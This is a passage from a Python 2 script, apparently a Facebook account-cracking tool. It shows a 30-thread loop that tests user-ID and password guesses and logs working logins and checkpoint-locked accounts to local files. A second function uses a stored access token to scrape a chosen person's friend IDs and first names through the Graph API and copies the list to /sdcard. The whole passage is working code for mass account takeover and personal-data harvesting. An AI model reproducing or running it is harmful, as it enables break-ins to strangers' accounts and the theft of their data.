																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("[Checkpoint] "+uid+" | "+pass7)
																	cp = open("checkpoint.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	main()
	
def file_ex():
    idg=[]
    global token
    try:
    	token = open("access_token.txt","r").read()
    except IOError:
    	print("\t    \033[1;31mToken not found\033[0;97m")
    	print("")
    	time.sleep(1)
    	login_choice()
    os.system("clear")
    print(logo)
    print("")
    print("\t    \033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
    print("")
    idh = raw_input(" Input Id: ")
    try:
        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
        q = json.loads(r.text)
        print(" Collecting from: "+q["name"])
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
        raw_input(" Press enter to back")
        crack()
    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open("ids_friends.txt","w")
    for i in q["data"]:
        uid = i["id"]
        na = i["name"]
        nm=na.rsplit(" ")[0]
        idg.append(uid+"|"+nm)
        ids.write(uid+"|"+nm + "\n")
    ids.close()
    print("")
    print(47*"-")
    print("")
    print(" The process has completed")
    print(" Total ids: "+str(len(idg)))
    print("")
    print(47*"-")
    print("")
    raw_input(" Press enter to download file")
    os.system("cp ids_friends.txt /sdcard")
    os.system("rm -rf ids_friends.txt")
    print(" File downloaded successfully")
    time.sleep(1)
    main()
	  
if __name__ == '__main__':
    main()